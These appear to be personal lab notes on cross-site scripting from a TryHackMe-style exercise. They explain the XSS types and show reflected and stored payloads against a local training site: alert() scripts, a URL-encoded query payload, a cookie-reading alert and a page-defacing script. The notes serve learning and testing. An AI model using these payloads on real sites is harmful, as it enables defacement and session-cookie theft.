# Cross-site Scripting (XSS)
Note:
- It's a vulnerability that allows attackers execute malicious code (JS, VB, Flash) on the client side.
- Three are types of XSS
	-  Stored XSS
	-  Reflected XSS
	-  DOM-based XSS
- Common XSS in web app uses JavaScript.

## Practical

### Reflected XSS


![4ec6b13ee3f3d1b6dabe6d0a008ab474.png](./_resources/d054aa752ab0433d8f154a61908aa899.png)

Source code:
```
<h6>You searched for: [Your input will be input directly in here]</h6>
```

With unsanitized user input, any malicous script can directly blend into page source code.

```
<h6><script>alert("Hello")</script></h6>
<h6><script>alert(window.location.hostname)</script></h6>
```

URL (THM deployed machine is tunneled to localhost)
```
http://localhost/reflected?keyword=%3Cscript%3Ealert%28%22Hello%22%29%3C%2Fscript%3E
```

![678e3bf00262203002bc52b3c3d2012d.png](./_resources/9e22a060be024612937869e74197f19a.png)

![f70d836f7903e212f6127e172ef89e44.png](./_resources/1d2c6787da8047ff93244cd20b5c9d20.png)

### Stored XSS

My payload

```
<!-- html comment test -->
```

![b16e06d04100faae6928c3c44e66b273.png](./_resources/93cf41204be64490bb8ac760b7c7aa87.png)

Steal user cookie

```
<script>alert(document.cookie)</script>
```

![cc7d15c25cca77de7a812c3f99d0ce81.png](./_resources/d098faf08f73456a870ec842de77d5ac.png)

With stored xss, we can change the entire page element(even deface)

For example changing "XSS Playground" to "Defaced"

First, inspect the element we want to change.

![c014e6a6142f6bd3a6f8020d2f7432b9.png](./_resources/dae50bbc9b57404883ca033b1acebdf3.png)

We could use console for testing

![db65ce2853b54803625a0a394e5610e5.png](./_resources/6f6f89f3e53d4b3ca74d3d7f501d28d8.png)

Now we could add something like this to the comment section and post it.
```
<script>document.getElementById("thm-title").innerText = "I am a hacker"</script>
```

![c2bd7aac5d51a945f2cd1c7bf7ed6125.png](./_resources/0a923d67eb6b4615867e0c48363665b8.png)


## Questions

![702bb3f532d40f0b83c7c849d12e7803.png](./_resources/1d2a0dab34c441fbae66916facc4b1ea.png)